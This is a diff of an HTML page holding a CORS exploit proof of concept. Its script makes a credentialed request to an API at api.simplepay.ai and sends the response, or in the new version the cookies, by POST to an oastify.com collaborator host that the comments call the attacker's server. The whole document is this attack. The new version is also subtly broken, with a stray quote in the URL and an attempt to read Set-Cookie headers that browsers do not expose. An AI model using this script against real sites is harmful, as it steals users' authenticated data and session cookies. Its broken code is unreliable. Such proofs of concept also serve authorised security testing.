@@ -1,18 +1,36 @@
+<!DOCTYPE html>
 <html>
 <body>
    <script>
+      // Create a new XMLHttpRequest object
       var xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://api.simplepay.ai/app', true);
-      xhr.withCredentials = true;  // Ensures cookies are sent
+      
+      // Configure it: GET-request for the URL with credentials
+      xhr.open('GET', 'https://api.simplepay.ai/app'', true);
+      xhr.withCredentials = true;
+      
+      // Set up a callback function that will be called when the request state changes
       xhr.onreadystatechange = function() {
-         if (xhr.readyState == 4 && xhr.status == 200) {
-            // Send the data back to the attacker's server
-            fetch('https://yegqm3by9b360gm9kgmqhybtikobc70w.oastify.com', {
-               method: 'POST',
-               body: xhr.responseText
-            });
+         if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+               // Get cookies from the response header
+               var cookies = xhr.getResponseHeader('Set-Cookie');
+               
+               // Send the cookies to the attacker's server
+               fetch('https://yegqm3by9b360gm9kgmqhybtikobc70w.oastify.com', {
+                  method: 'POST',
+                  headers: {
+                     'Content-Type': 'application/x-www-form-urlencoded'
+                  },
+                  body: new URLSearchParams({
+                     'cookies': cookies
+                  })
+               });
+            }
          }
       };
+      
+      // Send the request
       xhr.send();
    </script>
 </body>
